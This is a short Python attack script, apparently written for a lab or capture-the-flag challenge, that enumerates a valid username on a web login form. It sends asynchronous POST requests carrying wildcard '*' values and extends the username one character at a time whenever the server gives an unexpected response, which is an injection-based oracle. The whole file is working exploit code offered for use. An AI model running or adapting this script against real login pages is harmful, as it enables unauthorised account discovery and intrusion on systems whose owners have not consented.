#this works for unkown username and password 
import aiohttp
import asyncio
import sys
import string

# Check if the correct arguments are provided
if len(sys.argv) != 2:
    print("Usage: python script.py <url>")
    sys.exit(1)

url = sys.argv[1]  # URL from command-line arguments
password = "*"  # Replace with the valid password

# Define the character set to use for brute-forcing
characters = string.ascii_letters + string.digits + string.punctuation

async def attempt_login(session, username):
    data = {
        "username": username,
        "password": password
    }
    try:
        async with session.post(url, data=data) as response:
            response_text = await response.text()
            # Check the response for success or failure
            if response.status == 302 and response_text.strip() == "":
                print(f"Attempt with username '{username}' was successful!")
                return False
            elif 'Login failed' in response_text:
                print(f"Attempt with username '{username}' failed.")
                return False
            else:
                print(f"Attempt with username '{username}' received an unexpected response.")
                return True
    except aiohttp.ClientError as e:
        print(f"An error occurred while trying username '{username}':", e)
        return False

async def brute_force_username(session):
    valid_string = ""  # To store the successful characters

    while True:
        found_char = False
        for char in characters:
            username = valid_string + char + "*"  # Append character at the current position
            print(f"Trying username: {username}")
            if await attempt_login(session, username):
                print(f"Found valid character: {char}")
                valid_string += char  # Add the valid character to the result
                found_char = True
                break  # Move to the next position
        if not found_char:
            # If no valid character is found for the current position, stop the brute-force
            print("Brute-forcing complete. No more valid characters found.")
            break

    print(f"Full valid string: {valid_string}")

async def main():
    async with aiohttp.ClientSession() as session:
        print("Starting brute-force attack on username...")
        await brute_force_username(session)

# Run the asyncio event loop
asyncio.run(main())
